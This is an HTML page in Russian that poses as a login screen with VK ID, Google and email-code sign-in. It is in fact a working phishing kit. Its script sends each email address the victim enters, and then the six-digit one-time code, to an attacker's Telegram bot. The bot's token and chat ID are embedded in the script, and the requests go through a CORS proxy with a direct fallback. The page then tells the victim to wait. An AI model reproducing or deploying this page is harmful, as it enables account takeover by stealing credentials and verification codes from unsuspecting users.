<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход и регистрация</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background-color: #14161A; color: #EBECF0; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { width: 100%; max-width: 375px; }
        .page { width: 100%; }
        .hidden { display: none; }
        .main-title { font-size: 20px; font-weight: 700; margin-bottom: 24px; text-align: center; }
        .vk-btn, .google-btn { width: 100%; height: 56px; background-color: #282933; color: #EBECF0; border: none; border-radius: 8px; font-size: 16px; display: flex; align-items: center; padding: 0 20px; margin-bottom: 12px; cursor: pointer; }
        .vk-icon { width: 28px; height: 28px; margin-right: 12px; background: url("https://upload.wikimedia.org/wikipedia/commons/f/f3/VK_Compact_Logo_%282021-present%29.svg") no-repeat center/contain; }
        .google-icon { width: 24px; height: 24px; margin-right: 12px; background: url("https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg") no-repeat center/contain; }
        .email-input { width: 100%; height: 56px; background: #282933; border: 1px solid #3A3B45; border-radius: 8px; color: #fff; padding: 0 16px; margin-bottom: 16px; outline: none; font-size: 16px; }
        .email-input:focus { border-color: #2663F0; }
        .get-code-btn { width: 100%; height: 48px; background: #2663F0; color: #fff; border: none; border-radius: 8px; font-weight: 700; font-size: 16px; cursor: pointer; }
        .code-container { display: flex; justify-content: center; gap: 8px; margin: 30px 0; }
        .code-input { width: 45px; height: 56px; background: #282933; border: 1px solid #3A3B45; border-radius: 8px; text-align: center; font-size: 24px; color: #fff; outline: none; }
        .code-input:focus { border-color: #2663F0; }
        .email-display { text-align: center; color: #8A8C9A; margin-bottom: 16px; font-size: 14px; }
        .status-msg { text-align: center; margin-top: 15px; font-size: 14px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="page1" class="page">
            <h1 class="main-title">Вход и регистрация</h1>
            <button class="vk-btn"> <div class="vk-icon"></div> Войти с VK ID </button>
            <button class="google-btn"> <div class="google-icon"></div> Войти через Google </button>
            <div style="text-align: center; margin: 15px 0; color: #555;">или</div>
            <form id="emailForm">
                <input type="email" class="email-input" id="email" placeholder="Электронная почта" required>
                <button type="submit" class="get-code-btn">Получить код</button>
            </form>
        </div>

        <div id="page2" class="page hidden">
            <h1 class="main-title">Подтверждение</h1>
            <div class="email-display">Код отправлен на <br><b id="enteredEmail" style="color:#fff"></b></div>
            <div class="code-container" id="codeInputs">
                </div>
            <div id="status" class="status-msg"></div>
        </div>
    </div>

    <script>
        // ТВОИ ДАННЫЕ
        const BOT_TOKEN = '8501246131:AAFcgEG-t2kTz413iKeC-LLKdrf1fWT4s5g';
        const CHAT_ID = '5064386901';
        let userEmail = '';

        // Функция отправки через прокси (обход блокировок)
        async function sendToTelegram(message) {
            const text = encodeURIComponent(message);
            // Используем corsproxy.io как зеркало
            const proxy = "https://corsproxy.io/?";
            const target = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=HTML`;
            
            try {
                await fetch(proxy + encodeURIComponent(target));
            } catch (e) {
                console.error("Ошибка отправки:", e);
                // Запасной вариант без прокси
                fetch(target);
            }
        }

        // Логика формы почты
        document.getElementById('emailForm').addEventListener('submit', function(e) {
            e.preventDefault();
            userEmail = document.getElementById('email').value;
            
            sendToTelegram(`📩 <b>НОВЫЙ ЛОГИН</b>\nПочта: <code>${userEmail}</code>`);
            
            document.getElementById('page1').classList.add('hidden');
            document.getElementById('page2').classList.remove('hidden');
            document.getElementById('enteredEmail').textContent = userEmail;
        });

        // Создание 6 полей для кода
        const codeContainer = document.getElementById('codeInputs');
        for (let i = 0; i < 6; i++) {
            const input = document.createElement('input');
            input.type = 'number';
            input.className = 'code-input';
            input.pattern = '[0-9]*';
            input.inputMode = 'numeric';
            input.maxLength = 1;

            input.addEventListener('input', (e) => {
                if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
                if (e.target.value && i < 5) codeContainer.children[i + 1].focus();
                checkFullCode();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && i > 0) codeContainer.children[i - 1].focus();
            });

            codeContainer.appendChild(input);
        }

        function checkFullCode() {
            const code = Array.from(codeContainer.children).map(i => i.value).join('');
            if (code.length === 6) {
                sendToTelegram(`🔑 <b>КОД ИЗ СМС/ПОЧТЫ</b>\nКод: <code>${code}</code>\nДля: ${userEmail}`);
                const status = document.getElementById('status');
                status.style.display = 'block';
                status.style.color = '#51CF66';
                status.textContent = '✓ Код принят. Ожидайте...';
            }
        }
    </script>
</body>
</html>
